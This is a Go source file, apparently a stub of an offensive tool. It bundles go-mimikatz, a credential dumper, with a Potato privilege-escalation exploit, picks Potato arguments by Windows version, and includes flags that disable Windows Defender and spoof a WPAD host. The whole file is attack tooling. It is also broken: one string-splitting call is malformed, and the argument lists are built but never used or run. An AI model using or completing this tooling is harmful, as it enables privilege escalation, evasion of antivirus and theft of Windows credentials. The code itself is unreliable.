package main

/*
#cgo CFLAGS: -IMemoryModule
#cgo LDFLAGS: MemoryModule/build/MemoryModule.a
#include "MemoryModule/MemoryModule.h"
*/

import "C"

import (
	"os"
	"os/exec"
	"strings"
	"unsafe"
)

func main() {
	// load go-mimikatz exe
	goMimikatzExe, err := Asset("go-mimikatz.exe")
	if err != nil {
		panic(err)
	}

	// load potato exe
	potatoExe, err := Asset("potato.exe")
	if err != nil {
		panic(err)
	}

	// get system info
	osCheckOutput, err := exec.Command("wmic", "os", "get", "Caption,CSDVersion", "/value").Output()
	if err != nil {
		panic(err)
	}
	osCheckString := strings.Split(strings.Split(string(osCheckOutput, "\n")[0]), "=")[1]

	// check windows version
	switch {
	case strings.Contains(osCheckString, "Windows 7"):
		// run potato
		cArgs := []*C.char{
			C.CString("Potato.exe"),
			C.CString("-ip"),
			C.CString("127.0.0.1"),
			C.CString("-cmd"),
			C.CString("<command to run>"),
			C.CString("-disable_exhaust true"),
		}
	case strings.Contains(osCheckString, "Server 2008"):
		// run potato
		cArgs := []*C.char{
			C.CString("Potato.exe"),
			C.CString("-ip"),
			C.CString("127.0.0.1"),
			C.CString("-cmd"),
			C.CString("<command to run>"),
			C.CString("-disable_exhaust true"),
			C.CString("-disable_defender true"),
			C.CString("--spoof_host WPAD.EMC.LOCAL"),
		}
		// wait up to 30 min for it to work
	case strings.Contains(osCheckString, "8") ||
		strings.Contains(osCheckString, "10") ||
		strings.Contains(osCheckString, "Server 2012"):
		cArgs := []*C.char{
			C.CString("Potato.exe"),
			C.CString("-ip"),
			C.CString("127.0.0.1"),
			C.CString("-cmd"),
			C.CString("<command to run>"),
			C.CString("-disable_exhaust true"),
			C.CString("-disable_defender true"),
			// wait up to 24 hrs for it to work
		}
	default:
		panic("Could not identify windows version")
	}
}
